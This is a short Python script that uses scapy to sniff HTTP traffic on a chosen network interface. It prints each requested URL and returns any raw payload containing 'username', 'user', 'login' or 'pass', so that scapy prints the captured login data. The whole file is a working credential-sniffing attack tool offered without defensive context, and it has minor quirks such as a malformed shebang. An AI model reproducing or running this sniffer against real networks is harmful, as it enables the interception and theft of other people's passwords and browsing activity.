#!usr/bin/env python
import scapy.all as scapy
from pip._vendor.distlib.compat import raw_input
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)

def get_url(packet):
    url = str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
    print(url)

def sniffed_packet(packet):
    if packet.haslayer(http.HTTP):
        get_url(packet)
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username","user","login","pass"]
            for key in keywords:
                if key in load:
                    return load;


sniff(raw_input("Enter your interface "))